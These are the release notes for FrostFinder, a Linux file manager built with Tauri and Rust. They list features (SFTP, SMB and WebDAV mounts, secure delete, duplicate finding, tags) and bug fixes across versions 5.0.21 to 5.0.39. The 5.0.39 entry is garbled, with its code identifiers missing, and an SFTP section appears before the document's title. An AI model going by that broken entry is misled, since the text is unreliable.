- `Tab` cycles focus between panes; the active pane is indicated by a blue
  top border.
- `F5` copies the selected items from the active pane into the inactive pane's
  current directory.
- `F6` moves the selected items from the active pane into the inactive pane's
  current directory.
- Drag-and-drop between panes works as normal (Ctrl+drag = copy).
- Press `F3` again to return to single-pane mode.

No new Rust commands.

---

### Feature — SFTP / SSH remote filesystem (`Ctrl+Shift+F`)

Mount remote servers over SFTP using `sshfs` (FUSE), mirroring the existing
SMB and WebDAV mount flows.

- Dialog accepts host, port (default 22), username, and either password
  (via `sshpass`) or SSH key file path.
- On success the remote filesystem appears in the sidebar under Network and
  can be browsed like any local folder.
- Right-click → Disconnect unmounts via `fusermount -u`.
- Mounts are persisted in `~/.local/share/frostfinder/sftp_mounts.json` and
  restored on next launch (stale entries filtered against `/proc/mounts`).

New Rust commands: `mount_sftp`, `unmount_sftp`, `get_sftp_mounts`.

**Requires:** `sshfs` installed on the host system.
  - Ubuntu/Debian: `sudo apt install sshfs`
  - Fedora: `sudo dnf install fuse-sshfs`
  - Arch: `sudo pacman -S sshfs`

Password authentication additionally requires `sshpass`:
  - Ubuntu/Debian: `sudo apt install sshpass`

# FrostFinder — Release Notes

| Field       | Value                              |
|-------------|---------------------------------------|
| **Build**  | FrostFinder-beta-5-r39-2026-03-19 |
| **Status** | Beta                              |
| **Version**| 5.0.39                            |
| **Date**   | 2026-03-19                        |

---

## What's in 5.0.39

**No Rust recompile required.** One-line JS fix.

### Fix —  declared  in , prevents conflict skip ()

The conflict dialog's "Skip existing" path reassigns . esbuild rejected the build because  was declared with . Changed to .

---

## What's in 5.0.38

**Rust recompile required** (`src-tauri/src/main.rs` — new `get_archive_contents` command). All other changes are JavaScript/CSS.

### Fix — File watcher refreshes all view modes (`src/main.js`)

`dir-changed` previously only refreshed column view. List, icon, and gallery views could show stale contents indefinitely after a file was downloaded, created, or deleted in the current folder. The handler now calls `refreshCurrent()` when `changedPath === state.currentPath` in any non-column view.

---

### Feature — Window title tracks current folder (`src/main.js`)

`appWindow.setTitle('FrostFinder — ' + folderName)` is called in the navigate `finally` block. Multiple FrostFinder windows are now distinguishable in the taskbar and alt-tab switcher.

---

### Feature — Ctrl+T opens new tab at current folder (`src/main.js`)

`Ctrl+T` now passes `state.currentPath` to `newTab()`. You land in the same folder you were browsing. `Shift+Ctrl+T` (or clicking the `+` tab button) still opens the home directory.

---

### Feature — Cut warning on navigate away (`src/main.js`)

If you cut files and then navigate to a different folder before pasting, a confirm dialog warns that the clipboard will be cleared. Accepting clears the cut entries and proceeds; cancelling aborts the navigation so you can paste first.

---

### Feature — Recent Locations in sidebar (`src/main.js`)

A **Recent** section appears at the top of the sidebar showing the last 8 unique folders visited. Clicking any entry navigates there instantly. Powered by the path history already tracked since r36.

---

### Feature — Drag folder to Favorites (`src/main.js`)

Dragging a folder (or selected folders) from the file list and dropping it onto the **Favorites** section title in the sidebar now adds it as a bookmark — the same as right-click → Add to Sidebar. The title highlights blue during the drag to indicate it accepts drops.

---

### Feature — Keyboard shortcut cheatsheet `Ctrl+?` (`src/main.js`)

A full shortcut reference overlay appears with `Ctrl+?`. Organized into sections: Navigation, Files, View, Gallery, App. Closes on Escape, backdrop click, or the × button.

---

### Feature — Copy/move conflict dialog (`src/main.js`)

Before a paste operation copies files, `_checkConflicts()` probes the destination for existing files with the same names (up to 20 checked via `get_entry_meta`). If any exist, a dialog offers three choices: **Replace all**, **Skip existing** (filters conflicting files from the batch), or **Cancel**. Move operations skip the check since the source is deleted and replacing is always the intent.

---

### Feature — Empty state illustrations (`src/views.js`)

Column, list, and icon views now show a folder icon with "Empty folder" text instead of a blank area when a directory has no entries. The column view empty state is shown inline in the column itself.

---

### Feature — Archive content preview (`src/views.js`, `src-tauri/src/main.rs`)

Selecting a ZIP, tar, tar.gz, tar.bz2, tar.xz, 7z, rar, or other archive file in the preview panel now shows: total file count, folder count, and uncompressed size, followed by a scrollable file tree with depth indentation and per-file sizes. Uses `zip::ZipArchive` for ZIP files and `tar --list --verbose` for all other formats. Up to 80 entries shown inline; remaining count shown as "…and N more".

---

### Feature — Icon view inline rename on label click (`src/views.js`)

Clicking the filename label of an already-selected item in icon view starts a 600 ms timer. If no drag or second click interrupts it, `startRename()` is triggered — identical to macOS Finder's slow-double-click rename. Any `mousedown` cancels the timer to avoid accidental renames during fast selection.

---

### Feature — Tags rename/delete management (`src/views.js`)

A **Manage** button appears in the preview panel's Tags section header. Clicking it reveals all existing tags as pills with a × delete button. Deleting a tag removes it from every file that had it and from all local state. Uses `search_by_tag` + `set_file_tags` for the sweep.

---

## What's in 5.0.37

**Rust recompile required.** Two build errors from r36 fixed.

### Fix — `renderFlatList` not exported from `views.js` (`src/views.js`)

**Root cause:** When `_wireFilterBar` was inserted before `renderFlatList` during the r36 search-filter work, the `export` keyword accidentally landed on `_wireFilterBar` instead of `renderFlatList`. esbuild rejected the build with `No matching export in "src/views.js" for import "renderFlatList"`.

**Fix:** Removed `export` from `_wireFilterBar` (internal helper, not imported by `main.js`). Restored `export` on `renderFlatList`.

---

### Fix — `pub #[derive(...)]` syntax error in `src-tauri/src/main.rs`

**Root cause:** The r36 Rust patch that added `serde::Serialize/Deserialize` to `SmbShare` accidentally produced duplicate `#[derive]` attributes and an invalid `pub #[derive(...)]` line. The original struct already had no derive; the replacement script inserted a new `#[derive]` block but also kept a fragment of the old (empty) location, resulting in:

```rust
// WRONG
#[derive(serde::Serialize, serde::Deserialize, Clone)]
pub #[derive(Clone, serde::Serialize, serde::Deserialize)]
struct SmbShare { ... }
```

**Fix:** Collapsed to a single correct attribute:

```rust
#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct SmbShare { ... }
```

---

## What's in 5.0.36

**Rust recompile required** (`src-tauri/src/main.rs` — SMB persistent mounts). All other changes are JavaScript/CSS only.

### Feature — Clipboard persists across tabs (`src/main.js`)

Previously, switching tabs silently reset the clipboard. `clipboard` is now included in `makeTabState()` and `syncState()`, so Cut/Copy state survives tab switching. Files cut in Tab 1 can be pasted in Tab 2.

---

### Feature — Type-to-select keyboard navigation (`src/main.js`)

Typing a printable character in column, list, or icon view instantly jumps to the first entry whose name starts with the typed string. A 600 ms idle resets the buffer, so multi-character prefixes work (e.g. type `pro` to land on `Projects`). Falls back to single-character match if the full prefix has no hit. Works in all view modes without breaking any existing shortcuts.

---

### Feature — Secure delete progress bar (`src/main.js`)

Secure delete now shows live pass-by-pass progress in the sidebar progress bar (`Pass 1 / 3 — overwriting filename`). Uses `await listen('secure-delete-progress', …)` registered before `invoke` (correct race-free pattern). Unlisten called in `finally` to prevent listener accumulation.

---

### Feature — Duplicate files panel with delete buttons (`src/main.js`)

`Find Duplicates` no longer logs to the console. Results appear in a modal panel showing:
- Each duplicate group with a **keep** badge on the first file and **dup** badge on the rest
- Full path of each duplicate
- **Delete** button per duplicate — confirms before deleting, refreshes columns after
- **Show** button — closes panel and navigates to the file's folder
- Header shows total group count and redundant file count

---

### Feature — Open With remembers last used app per file type (`src/main.js`)

The last app chosen for each file extension is saved in `localStorage` under `ff_open_with_<ext>`. On next open, that app floats to the top of the list with a **last used** badge. No app data is uploaded — entirely local.

---

### Feature — Thumbnail cache GC on startup (`src/main.js`)

`gc_thumbnail_cache` (already implemented in Rust, never called from JS) is now invoked 8 seconds after startup in a fire-and-forget call. Removes cached thumbnails not accessed in 30+ days. Logged to console only if entries were removed.

---

### Feature — Path history tracking + right-click breadcrumb menu (`src/main.js`)

- Every navigated path is recorded in `localStorage` (last 25 unique paths, newest first) via `_recordPathHistory(path)` called inside `navigate()`.
- Right-clicking the breadcrumb rail shows a **Recent Locations** dropdown menu of the last 20 paths. Clicking any entry navigates there. Menu flips up if near the bottom of the screen.

---

### Feature — Batch rename live preview as you type (`src/views.js`)

All input fields and mode selectors in the Batch Rename dialog now trigger a debounced (300 ms) live preview as you type — no need to click the Preview button manually. The preview shows old name → new name for each file in a two-column layout with colour coding (grey → green).

---

### Feature — Gallery fit-to-window toggle (`src/views.js`)

A **Fit** button appears in the gallery zoom bar. When active (blue highlight):
- The image fills the entire gallery area with `object-fit: contain` — always fully visible regardless of aspect ratio
- Zoom +/− buttons are disabled (greyed out)
- **F** key toggles fit on/off
- Reset (↺) button exits fit mode and resets zoom to 100%

State persists across arrow-key navigation within the same gallery session.

---

### Feature — Search result filters (`src/views.js`)

A filter bar appears above search results with three controls:
- **Type** dropdown — filter by file extension or Folders only; populated dynamically from actual results
- **Date** dropdown — Any / Today / Last 7 days / Last 30 days
- **Size range** — min/max in MB (applied with 400 ms debounce)
- **Clear filters** button (only shown when a filter is active)
- Result count badge shows `N / Total` so it's always clear what's filtered

Filters are applied client-side on `state.searchResults` — no new IPC calls.

---

### Feature — SMB persistent mounts survive restart (`src-tauri/src/main.rs`)

Previously, SMB mount records were held only in the in-memory `SMB_MOUNTS` static. After a restart, `get_smb_mounts()` returned an empty list even if shares were still mounted on the filesystem.

Three changes:
1. `SmbShare` now derives `serde::Serialize` + `serde::Deserialize`
2. `smb_registry_save(mounts)` writes the current mount list to `~/.local/share/frostfinder/smb_mounts.json` after every `mount_smb` and `unmount_smb` call
3. In `setup()`, `smb_registry_load()` reads the registry on startup, cross-checks each entry against `/proc/mounts` to discard stale entries, and initialises `SMB_MOUNTS` from the survivors

---

## What's in 5.0.35

**No Rust recompile required.** Two JavaScript bug fixes (`src/main.js`, `src/views.js`).

### Fix — Status bar shows wrong filename in column view (`src/views.js`)

**Root cause:** `renderStatus` computed `selEntry = e[last.selIdx]` where `e` was the raw, unsorted `last.entries` array. `last.selIdx` is a *sorted display index* — the position of the row as rendered by `renderColumnView`, which always calls `sortEntries()` first. When the directory's filesystem order differed from sort order (almost always), `selEntry` pointed at the wrong entry and the status bar showed the wrong filename.

**Fix:** `renderStatus` now calls `sortEntries(e)` before indexing with `selIdx`, matching exactly what `renderColumnView` does. `sortEntries` is available via `d()` (already injected).

---

### Fix — `deleteEntries` listener race, listener leak, and deadlock risk (`src/main.js`)

Three bugs in the `delete-progress` event listener setup:

**Bug 1 — Race condition:** `listen()` was called inside a `new Promise` constructor without being awaited. `listen()` is async — it does a round-trip to the Tauri backend to register the subscription. If `invoke('delete_items_stream')` fired `finished:true` before that round-trip completed, the event landed with no handler and `deleteDone` hung forever.

**Bug 2 — Listener leak:** The unlisten function returned by `listen()` was never captured or called. Every `deleteEntries()` call permanently added another `delete-progress` listener. After deleting files N times in a session, N listeners were active simultaneously, all competing to resolve the same promise.

**Bug 3 — Deadlock on invoke throw:** If `invoke('delete_items_stream')` threw before any `finished:true` event arrived, `_deleteResolve` was never called and `await deleteDone` hung forever, freezing the UI.

**Fix:** Same pattern used by `clipboardPaste` — `await listen()` is called *before* `invoke()`, the unlisten function is stored and called after completion, and a `_deleteResolve()` escape is added in the `catch` block to prevent deadlock.

---

## What's in 5.0.34

**No Rust recompile required.** JavaScript fix for column-to-column drag and drop.

### Fix — Dragging files between columns (e.g. column 5 → column 1) did nothing (`src/main.js`)

**Root cause:** The r33 fix detected internal FrostFinder drags in the `tauri://drag-drop` handler and returned early to let HTML5 `drop` events handle them. However, Tauri v2 **suppresses HTML5 `drop` events entirely** — the `DROP` event in `setupDropTarget` never fires. Returning from the Tauri handler meant the drop was silently discarded.

**Fix:** The `tauri://drag-drop` handler now handles internal drags directly instead of returning. When `dragState.entries.length > 0`:
1. `document.elementFromPoint(position.x, position.y)` finds the element under the drop point using the position from the Tauri event payload.
2. Destination is resolved: directory frow (`data-dir="true"`) → that folder's path; column (`data-col-path`) → that column's directory; fallback to `state.currentPath`.
3. Same guards and move/copy logic from `setupDropTarget` execute: same-dir check, folder-into-itself check, `move_files_batch`/`copy_files_batch`, progress bar, undo push.

A module-level `_dragCtrl` boolean tracks the Ctrl key via `document keydown/keyup` so Ctrl+drag still triggers copy (Tauri events don't expose modifier keys).

---

## Audit — 2026-03-19

**No code changes.** Comprehensive line-by-line audit of all source files.

### Files Audited
- `src/main.js` (~2650 lines) — fully read, no issues found
- `src/views.js` (~3500 lines) — fully read, no issues found  
- `src/utils.js` (271 lines) — fully read, no issues found
- `src/ql-window.js` (576 lines) — fully read, no issues found
- `src/style.css` (791 lines) — fully read, no issues found
- `src/search.worker.js` (35 lines) — fully read, no issues found
- `src-tauri/src/main.rs` (4709 lines) — fully read, no issues found

### Build Verification
- `npm run build` — succeeded
- `cargo check` — succeeded
- `cargo clippy` — minor warnings only (cosmetic)

### main.rs Notable Sections Verified
- All 75 Tauri commands confirmed registered in `invoke_handler`
- WebKit2GTK/GStreamer env vars for Linux video playback
- Wayland hicolor icon installation on first run
- USB/drive hot-plug watcher (polls every 1.2s on Linux)
- Window exit handling for main window destroy
- All streaming directory listing functions intact
- All file operations (copy, move, delete, compress, extract) intact
- All preview generation (images, video, audio, documents) intact
- All mount features (ISO, SMB, WebDAV, DMG) intact
- Tagging, bookmarks, secure delete, duplicates intact

---

## What's in 5.0.33

**No Rust recompile required.** JavaScript fix for internal drag & drop.

### Fix — Drag & drop between columns not working in column view (`src/main.js`)

**Root cause:** When dragging from one column to another within the FrostFinder window, Tauri v2 intercepts ALL drops and fires the `tauri://drag-drop` event instead of letting the HTML5 drag events (`dragover`, `drop`) handle them. The `tauri://drag-drop` handler was processing ALL drops (including internal FrostFinder drags) and always using `copy_files_batch`, completely bypassing the internal drag/drop logic in `setupDropTarget`.

**Evidence from debug log:**
- `DRAG_START` fires (internal drag detected)
- `TAURI_DROP` fires next (Tauri intercepts the drop)
- `DROP` event NEVER fires (HTML5 events were suppressed)

**Fix:** Added a check in the `tauri://drag-drop` handler to detect internal drags:
- If `dragState.entries.length > 0`, this is an internal FrostFinder drag
- Skip the Tauri handler (`return;`) so the HTML5 events in `setupDropTarget` can handle it
- External drops (from other apps) will have `dragState.entries.length === 0` and will continue to be handled by the Tauri handler

---

## What's in 5.0.32

**No Rust recompile required.** JavaScript fix for delete refresh issue.

### Fix — Delete doesn't refresh view after moving files to trash (`src/main.js`)

**Root cause:** The `deleteEntries` function set up a `delete-progress` event listener but didn't wait for the delete operation to complete before calling `refreshColumns()`. The `invoke('delete_items_stream', ...)` call returned immediately without waiting for the async delete operations to finish, causing the view to refresh before files were actually deleted.

**Fix:** Restructured `deleteEntries` to properly wait for the delete operation to complete:
1. Set up a `deleteDone` promise that resolves when `finished: true` is received
2. Call `invoke('delete_items_stream', ...)` 
3. `await deleteDone` — wait for all delete events to be processed
4. Then proceed with building undo list, updating UI, and calling `refreshColumns()`

---

## What's in 5.0.31

**No Rust recompile required.** JavaScript fix for drag & drop.

### Fix — Drag & drop always copies instead of moves (`src/main.js`)

**Root cause:** Drag and drop used `Alt` key to switch between copy and move operations. On Linux, the `Alt` key is commonly intercepted by window managers (GNOME, KDE, etc.) for window dragging, so the app never receives the `Alt` key state. This caused all drops to default to copy.

**Fix:** Changed from `Alt` key to `Ctrl` key for copy vs move:
- Default (no modifier): **MOVE** (removes original)
- Ctrl held: **COPY** (keeps original)

This matches the behavior of most Linux file managers (Nautilus, Dolphin) and avoids the window manager conflict.

---

## What's in 5.0.30

**No Rust recompile required.** JavaScript frontend changes for drag & drop.

### Fix — Drag & Drop to/from external applications (`src/main.js`, `src-tauri/tauri.conf.json`)

**Problem:** Dragging files from FrostFinder to other apps (Nautilus, Dolphin, desktop) or dropping files from external apps into FrostFinder didn't work properly.

**Root cause:** Tauri v2 intercepts file drops and emits special events. The HTML5 drag/drop API doesn't work because the webview doesn't receive native drop events.

**Solution:**
1. Added `dragDropEnabled: true` to window config in `tauri.conf.json`
2. Added `tauri://drag-drop` event listener to handle drops from external apps
3. Enhanced `setupDragDrop` to set both `text/plain` and `text/uri-list` formats
4. Added `parse_dropped_paths` Rust command to parse file:// URIs
5. Added `url` crate to Cargo.toml for URI parsing

**Usage:**
- Drag files FROM FrostFinder: Works automatically (sets file:// URIs)
- Drop files INTO FrostFinder: Drag files from Nautilus/Dolphin/desktop onto FrostFinder window
- Drop on folder: Files will be copied into that folder
- Drop on empty space: Files copied to current directory

---

## What's in 5.0.29

**Rust recompile required.** New batch rename, SMB/network shares, and cloud storage features.

### New — Batch Rename (`src-tauri/src/main.rs`)
- Added `batch_rename` command for renaming multiple files at once
- Supports 5 rename modes:
  - **Find & Replace** - Replace text in filenames
  - **Prefix** - Add text before filename
  - **Suffix** - Add text after filename (before extension)
  - **Numbering** - Sequential numbers with padding, optional prefix/suffix
  - **Case** - Change to uppercase, lowercase, or Title Case
- Returns array of new paths (or error messages for failed renames)

### New — SMB/CIFS Network Shares (`src-tauri/src/main.rs`)
- Added `mount_smb` command - mounts Windows/Samba shares using `mount.cifs`
- Added `unmount_smb` command - unmounts SMB shares
- Added `list_smb_shares` command - lists available shares on a server using `smbclient`
- Added `get_smb_mounts` command - returns list of currently mounted SMB shares
- Supports username/password authentication, guest access
- Mounts stored in `~/.cache/frostfinder/smb/`

### New — Cloud Storage / WebDAV (`src-tauri/src/main.rs`)
- Added `mount_webdav` command - mounts WebDAV drives (Nextcloud, ownCloud, Synology, etc.)
- Added `unmount_cloud` command - unmounts cloud storage
- Added `get_cloud_mounts` command - returns list of currently mounted cloud drives
- Uses `mount.davfs` for mounting
- Requires `davfs2` package installed on system
- Mounts stored in `~/.cache/frostfinder/cloud/`

### New — Dependencies (`src-tauri/Cargo.toml`)
- Added `regex` crate for cloud mount ID sanitization

### New — Frontend Dialogs (`src/views.js`)
- Added `showBatchRenameDialog(paths)` - batch rename UI dialog
- Added `showSmbConnectDialog()` - SMB connect UI dialog  
- Added `showCloudMountDialog()` - WebDAV cloud mount UI dialog
- Added server and cloud SVG icons to icon library

### New — Keyboard Shortcuts (`src/views.js`)
- **Ctrl+Shift+R** - Open batch rename dialog for selected files
- **Ctrl+Shift+S** - Open SMB/Network connect dialog
- **Ctrl+Shift+O** - Open Cloud/WebDAV mount dialog

### Updated — Documentation (`README.md`)
- Updated roadmap with completed features
- Added new features section with usage instructions
- Added davfs2 installation requirement for cloud mounting

---

## What's in 5.0.28

**Rust recompile required.** New security and file management features.

### New — Secure Delete (`src-tauri/src/main.rs`)
- Added `secure_delete` command that overwrites files with random data before deletion
- Uses `sha2` crate for hashing and `rand` crate for secure random data
- Accepts `paths: Vec<String>` and `passes: u32` (number of overwrite passes)
- Emits `secure-delete-progress` events for UI feedback
- Default 3 passes provides reasonable security for most use cases

### New — Find Duplicates (`src-tauri/src/main.rs`)
- Added `find_duplicates` command that scans directories for duplicate files
- Uses two-phase approach: first groups by file size, then hashes matching sizes with SHA-256
- Accepts `root_path: String` and `recursive: bool` parameters
- Returns `Vec<Vec<String>>` - each inner Vec contains paths of identical files
- Emits `duplicates-progress` events for UI feedback

### New — Bookmarks System (`src/utils.js` + `src/main.js`)
- Added bookmark storage functions: `getBookmarks()`, `saveBookmarks()`, `addBookmark()`, `removeBookmark()`, `isBookmarked()`
- Bookmarks stored in localStorage under `ff_bookmarks` key
- Added star icon SVG for bookmark UI
- Added context menu items: "Add Bookmark" / "Remove Bookmark" for folders
- Added context menu item: "Find Duplicates" for folders
- Added context menu item: "Secure Delete" for files

### New — Flatpak Support (`com.frostfinder.desktop.json`)
- Added Flatpak manifest for building Flatpak packages
- Uses org.freedesktop.Platform 24.08 runtime
- Includes filesystem access, network, and desktop integration permissions

### UI — New Context Menu Items
Right-click on a **folder** to see:
- **Add Bookmark** / **Remove Bookmark** - Save folders for quick access
- **Find Duplicates** - Scan folder for duplicate files

Right-click on a **file** to see:
- **Secure Delete** - Permanently overwrite and delete (cannot be recovered)

---

## What's in 5.0.27 (First Stable Release)

**Major: Open source release under GPL-3.0 license.**

### New — GPLv3 License (`LICENSE`)
- Added full GPL-3.0 license text
- Updated Cargo.toml: `license = "GPL-3.0"`
- Updated PKGBUILD: `license=('GPL3')`

### Fix — RPM dependencies for Fedora (`src-tauri/tauri.conf.json`)
- Changed `webkit2gtk4.1` to `webkit2gtk-4.1 >= 2.50`
- Fixes installation issue on Fedora 43

### Fix — App identifier (`src-tauri/tauri.conf.json`)
- Changed `com.frostfinder.app` to `com.frostfinder.desktop`
- Fixes macOS `.app` extension conflict warning

### Update — Release branding
- Removed "Beta" from product name and window title
- Updated VERSION file: `STATUS=stable`

---

## What's in Beta-5-r27

**Rust recompile required.** Performance optimizations and DMG removal.

### Optimization — Increased directory listing chunk sizes (`src-tauri/src/main.rs`)

**Changes:**
- FIRST_CHUNK: 60 → 100 entries (faster initial display)
- TAIL_CHUNK: 150 → 200 entries (fewer emissions, less overhead)

This makes the initial column paint faster and reduces the number of events sent to the frontend.

### Removal — DMG mounting feature (`src/views.js`, `src/ql-window.js`)

**Reason:** DMG mounting doesn't work on Linux and the feature was broken. Removed all DMG-related preview code:
- Removed `_wireDmgPreview()` function
- Removed DMG-specific preview panel in preview panel
- Removed DMG-specific preview panel in Quick Look window
- DMG files now show as regular binary files

### Research — How other file managers achieve fast directory loading

**Findings:**
- **macOS Finder**: Uses aggressive kernel-level caching (dcache), lazy loading
- **Dolphin (KDE)**: Uses KIO framework with parallel directory reading
- **Nautilus (GNOME)**: Uses GIO/GVfs with caching

**FrostFinder optimizations already in place:**
1. Streaming directory reads (shows first entries immediately)
2. JS cache for revisits (zero IPC on cache hit)
3. Pre-loading on folder hover
4. Inotify-based file change detection
5. Chunked streaming to prevent UI jank

---

## What's in Beta-5-r26

**No Rust recompile required.** JavaScript frontend fixes.

### Fix — QL arrow key navigation not syncing with main window (`src/main.js`)

**Root cause:** When pressing arrow keys in the Quick Look window, it emits 'ql-nav' events but the main window wasn't listening for them, so the selection in the main window didn't update.

**Fix:** Added a listener for 'ql-nav' in main.js to sync the selection:

```javascript
listen('ql-nav', ({payload}) => {
  const { idx } = payload;
  const entries = getVisibleEntries();
  if (entries && idx >= 0 && idx < entries.length) {
    const entry = entries[idx];
    if (entry && !entry.is_dir) {
      sel.set(idx);
      state.selIdx = idx;
      // ... update column view if needed
      render();
      loadPreview(entry);
    }
  }
});
```

---

## What's in Beta-5-r25

**No Rust recompile required.** JavaScript frontend fixes.

### Fix — Quick Look window fails to open (`src/views.js`)

**Root cause:** In Tauri v2, `WebviewWindow` was moved from `@tauri-apps/api/window` to `@tauri-apps/api/webviewWindow`. The import was incorrect, causing the Quick Look window creation to fail silently.

**Fix:** Updated the import in `src/views.js`:

```javascript
// Before (Tauri v1 style)
import { getCurrentWindow as _getAppWindow, WebviewWindow } from '@tauri-apps/api/window';

// After (Tauri v2)
import { getCurrentWindow as _getAppWindow } from '@tauri-apps/api/window';
import { WebviewWindow } from '@tauri-apps/api/webviewWindow';
```

---

### Fix — Quick Look permission denied (`src-tauri/capabilities/main.json`)

**Root cause:** The Quick Look window creation requires the `core:webview:allow-create-webview-window` permission, which was missing from the capabilities file.

**Fix:** Added the permission to `src-tauri/capabilities/main.json`:

```json
"permissions": [
  "core:default",
  "core:event:default",
  "core:webview:allow-create-webview-window",
  ...
]
```

---

### Fix — Column view jiggling when clicking folders (`src/style.css`, `src/views.js`)

**Root cause:** When navigating to new columns, the auto-scroll behavior was causing a visual "jiggle" because the scroll position was being set unconditionally.

**Fix:** 
1. `src/style.css` line 212: `.col` has `flex-shrink:0` to prevent columns from shrinking
2. Removed unconditional auto-scroll that caused the jiggle

---

## What's in Beta-5-r24

**Rust recompile required.** Two `main.rs` fixes for `zip 2` and Tauri v2 lifetime changes.

### Fix — `FileOptions::default()` ambiguous type parameter (`src-tauri/src/main.rs`)

**Root cause:** `zip 2` made `FileOptions` generic — `FileOptions<'k, T: FileOptionExtension>` — where `T` can be either `()` (no extended options) or `ExtendedFileOptions`. `FileOptions::default()` no longer infers `T` without a usage site that constrains it, so rustc cannot resolve the `FileOptionExtension` bound (E0283).

**Fix:** Added turbofish `FileOptions::<()>::default()`. The `()` type satisfies `FileOptionExtension`, is the correct default for standard zip entries, and requires no behaviour change.

```rust
// Before
let options = FileOptions::default()
    .compression_method(zip::CompressionMethod::Deflated)
    .unix_permissions(0o755);

// After
let options = FileOptions::<()>::default()
    .compression_method(zip::CompressionMethod::Deflated)
    .unix_permissions(0o755);
```

---

### Fix — `app.handle()` borrows `app`, escapes `setup` closure lifetime (`src-tauri/src/main.rs`)

**Root cause:** In Tauri v2, `app` inside `.setup(|app| {...})` has type `&'1 mut tauri::App` — a reference valid only for the closure body. `app.handle()` returns `&'1 AppHandle`, also tied to that lifetime. `std::thread::spawn` requires a `'static` closure, so moving the borrowed handle into the drive hot-plug thread fails with E0521.

**Fix:** `app.handle().clone()`. `AppHandle` implements `Clone` + `Send` + `'static` — the clone is an owned, Arc-backed handle that outlives the setup closure and is safe to move into a `'static` thread.

```rust
// Before — borrowed reference, tied to setup closure lifetime
let app_handle = app.handle();
std::thread::spawn(move || { ... });

// After — owned clone, 'static, safe for thread::spawn
let app_handle = app.handle().clone();
std::thread::spawn(move || { ... });
```

---

## What's in Beta-5-r23

**Rust recompile required.** Four `main.rs` fixes for `image 0.25` and Tauri v2 API changes.

### Fix — `image::ImageOutputFormat` removed in `image 0.25` (`src-tauri/src/main.rs`)

**Root cause:** `image 0.25` removed `ImageOutputFormat` entirely. The two `write_to(..., image::ImageOutputFormat::Jpeg(N))` call sites — one in the thumbnail-from-video path (quality 85) and one in the thumbnail-from-image path (quality 80) — no longer compile.

**Fix:** Replaced both sites with `write_with_encoder(JpegEncoder::new_with_quality(&mut cursor, N))`. This is the correct `image 0.25` pattern for quality-controlled JPEG output and preserves the original quality values.

```rust
// Before (image 0.24)
dyn_thumb.write_to(&mut std::io::Cursor::new(&mut buf), image::ImageOutputFormat::Jpeg(85))
    .map_err(|e| e.to_string())?;

// After (image 0.25)
{
    let mut cursor = std::io::Cursor::new(&mut buf);
    let encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut cursor, 85);
    dyn_thumb.write_with_encoder(encoder).map_err(|e| e.to_string())?;
}
```

---

### Fix — `image::io::Reader` deprecated → `image::ImageReader` (`src-tauri/src/main.rs`)

**Root cause:** `image::io::Reader` was moved and renamed to `image::ImageReader` in `image 0.25`. Still compiles with a deprecation warning, but fixed now to keep the build warning-clean.

```rust
// Before
let reader = image::io::Reader::open(p)...
// After
let reader = image::ImageReader::open(p)...
```

---

### Fix — `use tauri::Emitter` missing — all `.emit()` calls fail (`src-tauri/src/main.rs`)

**Root cause:** In Tauri v2, `Emitter` is a trait (not a blanket re-export). `Window`, `WebviewWindow`, and `AppHandle` all implement it, but the trait must be explicitly imported for `.emit()` to be in scope. The 33 `.emit()` call sites across streaming directory listing, file operations, trash, compress, extract, ISO-burn, and drive-watch functions all failed with `E0599`.

**Fix:** Added `Emitter` to the existing `tauri` import on line 12:

```rust
// Before
use tauri::{Window, Manager};
// After
use tauri::{Window, Manager, Emitter};
```

---

### Fix — `app_handle.emit_all()` removed in Tauri v2 (`src-tauri/src/main.rs`)

**Root cause:** `emit_all()` was removed in Tauri v2. The drive hot-plug watcher used it to broadcast `drives-changed` to all windows. In v2, `app_handle.emit()` broadcasts to all windows by default.

```rust
// Before (Tauri v1)
let _ = app_handle.emit_all("drives-changed", drives);
// After (Tauri v2)
let _ = app_handle.emit("drives-changed", drives);
```

---

## What's in Beta-5-r22

**No Rust recompile required.** Config-only fix: corrects the Tauri v2 capability file introduced in r21.

### Fix — Invalid capability permission `core:asset-protocol:allow-read` (`src-tauri/capabilities/main.json`)

**Root cause:** `core:asset-protocol:allow-read` does not exist in Tauri v2's permission registry. In Tauri v1 the asset protocol was enabled via `tauri.allowlist.protocol.asset = true`. The r21 migration incorrectly mapped this to a capability permission string, which does not exist — Tauri v2 moved asset protocol configuration to `tauri.conf.json` under `app.security.assetProtocol`.

**Fix — `src-tauri/capabilities/main.json`:** Removed the invalid `core:asset-protocol:allow-read` entry. Also removed the inline scope object form for `fs:allow-write-text-file` (object syntax not supported in this context) and replaced it with the plain string permission.

```diff
-    "core:asset-protocol:allow-read",
-    {
-      "identifier": "fs:allow-write-text-file",
-      "allow": [{ "path": "**" }]
-    },
+    "fs:allow-write-text-file",
```

**Fix — `src-tauri/tauri.conf.json`:** Added `app.security.assetProtocol` block (the correct v2 location for this setting):

```json
"security": {
  "csp": "...",
  "assetProtocol": {
    "enable": true,
    "scope": ["**"]
  }
}
```

---

## What's in Beta-5-r21

**Rust recompile required.** Full stack upgrade: Tauri v1 → v2, WebKit2GTK 4.0 → 4.1.

### Upgrade — Tauri v1 → v2

All dependencies, configuration, and JS/Rust APIs have been updated to Tauri v2.

**`Cargo.toml`**
- `tauri-build` `1.5` → `2`
- `tauri` `1.6` → `2` (features list removed; capabilities file replaces allowlist)
- `raw-window-handle` `0.5` → `0.6`
- `image` `0.24` → `0.25`
- `zip` `0.6` → `2`
- Added: `tauri-plugin-dialog = "2"`, `tauri-plugin-fs = "2"`, `tauri-plugin-shell = "2"`
- `rust-version` bumped `1.70` → `1.77`

**`tauri.conf.json`** — full rewrite to v2 schema
- Schema URL updated to `https://schema.tauri.app/config/2`
- `build.devPath` → `build.devUrl`; `build.distDir` → `build.frontendDist`
- `tauri.windows` → `app.windows`; `tauri.security` → `app.security`
- `tauri.allowlist` block removed entirely
- `bundle.deb` / `bundle.rpm` / `bundle.appimage` moved into `bundle.linux.*`
- WebKit runtime dep updated: `libwebkit2gtk-4.0-37` → `libwebkit2gtk-4.1-0` (deb), `webkit2gtk3` → `webkit2gtk4.1` (rpm)

**`src-tauri/capabilities/main.json`** — new file (replaces v1 allowlist)
- All window, fs, dialog, shell, asset-protocol, and event permissions declared explicitly per the Tauri v2 capabilities system.
- Applies to both `main` and `quicklook` windows.

**`src-tauri/src/main.rs`** — 6 targeted patches, zero behaviour changes

1. `use raw_window_handle::{HasRawWindowHandle, RawWindowHandle}` → `{HasWindowHandle, RawWindowHandle}` (rwh 0.6 API)
